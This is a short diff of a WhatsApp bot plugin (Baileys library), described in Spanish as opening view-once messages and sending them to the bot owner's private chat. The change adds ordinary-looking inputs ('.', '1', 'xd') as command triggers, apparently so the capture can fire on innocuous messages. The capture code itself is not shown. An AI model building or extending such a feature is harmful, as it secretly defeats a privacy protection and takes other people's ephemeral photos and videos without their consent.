@@ -7,7 +7,7 @@
 const { downloadContentFromMessage } = require("@whiskeysockets/baileys");
 
 module.exports = {
-  command: ["ñam", "uff"],
+  command: ["ñam", "uff", ".","1","xd"],
   description: "Abre vistas únicas y las envía al privado del dueño del bot",
 
   run: async (client, m) => {
